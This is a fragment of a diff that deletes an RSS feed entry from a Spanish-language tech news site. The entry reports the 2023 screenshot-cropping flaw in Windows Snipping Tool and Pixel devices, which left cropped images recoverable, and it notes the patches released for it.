-&lt;/ul&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;Copy an image (to have a backup)&lt;/li&gt;
-  &lt;li&gt;Open one with Snipping tool&lt;/li&gt;
-  &lt;li&gt;Crop it to make it much smaller&lt;/li&gt;
-  &lt;li&gt;Click the Save icon&lt;/li&gt;
-  &lt;li&gt;Compare file sizes of cropped and original&lt;/li&gt;
-  &lt;li&gt;Wonder about the world that you live in&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;El fallo permitía que aquellos que recibían las capturas recortadas en &lt;code&gt;PNG&lt;/code&gt; pudiesen recuperar parte de la imagen original, dejando visible lo que los usuarios habían querido ocultar. Esto podia ocasinar que se viesen datos sensibles. Ahora, tanto Microsoft como Google, han lanzado unos parches de seguridad para solucionarlo.&lt;/p&gt;
-
-&lt;p&gt;Por lo tanto, los propietarios de dispositivos &lt;code&gt;Pixel&lt;/code&gt; solo tendrán que actualizarlos para evitar recortes de pantalla inservibles. Sin embargo, los de &lt;code&gt;Windows&lt;/code&gt; tendrán que dirigirse a Microsoft Store para hacer lo propio, pero con las plataformas y no con el ordenador.&lt;/p&gt;
-</description>
-        <pubDate>Tue, 28 Mar 2023 00:00:00 +0000</pubDate>
-        <link>http://localhost:4000/novedades/parche-capturadePantalla-windows</link>
-        <guid isPermaLink="true">http://localhost:4000/novedades/parche-capturadePantalla-windows</guid>
-        
-        <category>windows</category>
-        
-        <category>parche</category>
-        
-        <category>seguridad</category>
-        
-        
-        <category>novedades</category>
         
       </item>
     
